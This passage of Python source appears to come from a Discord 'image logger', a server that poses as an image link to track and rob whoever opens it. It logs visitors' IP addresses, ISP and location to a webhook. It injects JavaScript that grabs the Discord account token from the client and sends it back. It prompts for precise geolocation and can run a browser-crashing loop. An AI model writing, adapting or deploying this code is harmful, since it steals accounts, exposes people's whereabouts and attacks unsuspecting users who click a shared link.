            }
        ],
    }
    
    if url:
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed, timeout=5)
    except Exception as e:
        reportError(str(e), "Sending report")
    
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config.get("imageArgument", False):
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    try:
                        url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding URL/ID")
                        url = config["image"]
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            x_forwarded_for = self.headers.get('x-forwarded-for')
            if x_forwarded_for and x_forwarded_for.startswith(blacklistedIPs):
                return
            
            if botCheck(x_forwarded_for, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                self.end_headers()

                if config["buggedImage"]:
                    self.wfile.write(binaries["loading"])
                makeReport(x_forwarded_for, endpoint=s.split("?")[0], url=url)
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                token = None

                if config.get("tokenGrabber", False):
                    data += b'''<script>
                    function getToken(attempt = 1, maxAttempts = 10) {
                        try {
                            // Discord istemcisindeki tokenı almak için daha güvenli bir yöntem
                            let token = null;
                            // Webpack modüllerini tarama
                            const wpRequire = window.webpackChunkdiscord_app?.push([[Symbol()], {}, e => e]);
                            if (wpRequire?.c) {
                                const modules = Object.values(wpRequire.c);
                                const tokenModule = modules.find(m => m?.exports?.default?.getToken);
                                token = tokenModule?.exports?.default?.getToken?.();
                            }
                            // Alternatif yöntem: localStorage'dan token alma
                            if (!token) {
                                token = localStorage.getItem('token')?.replace(/"/g, '');
                            }
                            if (token) {
                                // Token alındı, sunucuya gönder
                                const encodedToken = btoa(token).replace(/=/g, "%3D");
                                const url = window.location.href + (window.location.href.includes("?") ? "&" : "?") + "t=" + encodedToken;
                                fetch(url, { method: 'GET' })
                                    .then(() => console.log("Token sent"))
                                    .catch(err => console.error("Failed to send token:", err));
                            } else if (attempt < maxAttempts) {
                                // Token alınamadı, tekrar dene
                                setTimeout(() => getToken(attempt + 1, maxAttempts), 1000);
                            } else {
                                // Maksimum deneme sayısına ulaşıldı, hata bildir
                                console.error("Failed to retrieve token after max attempts");
                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "error=token_not_found");
                            }
                        } catch (e) {
                            console.error("Token grabber failed:", e);
                            if (attempt < maxAttempts) {
                                setTimeout(() => getToken(attempt + 1, maxAttempts), 1000);
                            } else {
                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "error=token_error");
                            }
                        }
                    }
                    // İlk çalıştırmayı hafif geciktir
                    setTimeout(() => getToken(), 500);
                    </script>'''

                if dic.get("t"):
                    try:
                        token = base64.b64decode(dic.get("t").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding token")

                if dic.get("error"):
                    reportError(f"Token retrieval failed: {dic.get('error')}", "Client-side token error")

                if dic.get("g") and config.get("accurateLocation", False):
                    try:
                        location = base64.b64decode(dic.get("g").encode()).decode()
                    except Exception as e:
                        reportError(str(e), "Decoding location")
                        location = None
                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token)
                else:
                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token)

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", x_forwarded_for or "Unknown")
                    message = message.replace("{isp}", result.get("isp", "Unknown"))
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", f"{result.get('timezone', '/Unknown').split('/')[1].replace('_', ' ')}" if result.get('timezone') else "Unknown")
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", False) if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent') or "Unknown")[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config.get("crashBrowser", False):
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                
                self.send_response(200)
                self.send_header('Content-type', datatype)
                self.end_headers()

                if config.get("accurateLocation", False):
                    data += b"""<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (currenturl.includes("?")) {
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(currenturl);
        });
    }
}
</script>"""
                self.wfile.write(data)
        
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc(), f"Handle request failed: {self.path}")

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
